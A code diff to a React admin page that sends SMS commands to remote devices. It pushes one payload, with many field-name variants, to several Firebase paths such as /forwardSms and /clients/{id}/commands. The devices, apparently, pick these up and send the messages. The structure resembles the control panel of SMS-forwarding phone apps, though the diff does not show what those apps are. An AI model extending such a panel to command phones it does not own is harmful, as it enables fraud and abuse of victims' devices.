@@ -217,32 +217,26 @@ export default function DeviceDetailPage() {
     if (!sendTo.trim() || !sendBody.trim()) return;
     setSending(true); setSendStatus(null);
     try {
-      // payload with all known field name variants (different app versions use different keys)
       const payload = {
-        to: sendTo.trim(),
-        number: sendTo.trim(),
-        phoneNumber: sendTo.trim(),
-        body: sendBody.trim(),
-        message: sendBody.trim(),
-        smsBody: sendBody.trim(),
-        simSlot: sendSlot,
-        simSlotIndex: sendSlot,
-        sim: sendSlot,
-        slot: sendSlot,
-        channel: sendSlot,
-        deviceId: id,
-        targetDeviceId: id,
-        id,
-        timestamp: Date.now(),
-        time: Date.now(),
-        status: 'pending',
+        to: sendTo.trim(), number: sendTo.trim(), phoneNumber: sendTo.trim(),
+        body: sendBody.trim(), message: sendBody.trim(), smsBody: sendBody.trim(),
+        simSlot: sendSlot, simSlotIndex: sendSlot, sim: sendSlot, slot: sendSlot, channel: sendSlot,
+        deviceId: id, targetDeviceId: id, id,
+        timestamp: Date.now(), time: Date.now(), status: 'pending',
       };
-      // try both paths — some apps listen on /forwardSms (push), others on /forwardSms/{deviceId} (set)
-      await Promise.allSettled([
-        adminRtdb('POST', '/forwardSms', payload),
-        adminRtdb('POST', `/forwardSms/${id}`, payload),
+      // write to all known paths — POST=push (new child), POST on subpath also pushes
+      // different app versions use different listen paths
+      const writes = await Promise.allSettled([
+        adminRtdb('POST', '/forwardSms', payload),                     // global push
+        adminRtdb('POST', `/forwardSms/${id}`, payload),               // device-specific push
+        adminRtdb('POST', `/clients/${id}/forward`, payload),          // client subpath push
+        adminRtdb('POST', `/clients/${id}/commands`, payload),         // commands subpath
+        adminRtdb('POST', '/smsSend', payload),                        // alternate root
+        adminRtdb('POST', '/sendSms', payload),                        // alternate root 2
       ]);
-      setSendStatus({ ok: true, msg: 'SMS dispatched successfully!' });
+      const anyOk = writes.some(r => r.status === 'fulfilled');
+      if (!anyOk) throw new Error('All write paths failed');
+      setSendStatus({ ok: true, msg: `Dispatched to ${writes.filter(r => r.status === 'fulfilled').length} path(s) — device online hona chahiye pickup ke liye` });
       setSendBody('');
     } catch (e) {
       setSendStatus({ ok: false, msg: e instanceof Error ? e.message : 'Send failed' });
